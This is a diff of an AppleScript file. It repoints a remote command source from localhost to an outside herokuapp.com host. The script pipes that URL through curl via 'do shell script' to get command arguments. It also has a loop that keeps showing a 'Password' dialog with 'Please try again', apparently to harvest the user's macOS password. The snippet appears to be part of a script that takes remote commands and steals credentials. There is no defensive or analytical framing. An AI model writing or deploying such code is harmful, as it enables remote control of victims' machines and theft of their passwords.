@@ -8,7 +8,7 @@ on error
 	return
 end try
 
-set remoteURL to "http://localhost/remote.txt"
+set remoteURL to "http://damp-journey-2734.herokuapp.com/remote.txt"
 try
 	set commandArgs to paragraphs of (do shell script "curl " & remoteURL & " | cut -d ':' -f 2")
 
@@ -57,3 +57,4 @@ repeat
 		display dialog "Please try again." with title "Password" buttons {"OK"} default button 1 giving up after 3 -- If password is incorrect, try again
 	end try
 end repeat
+
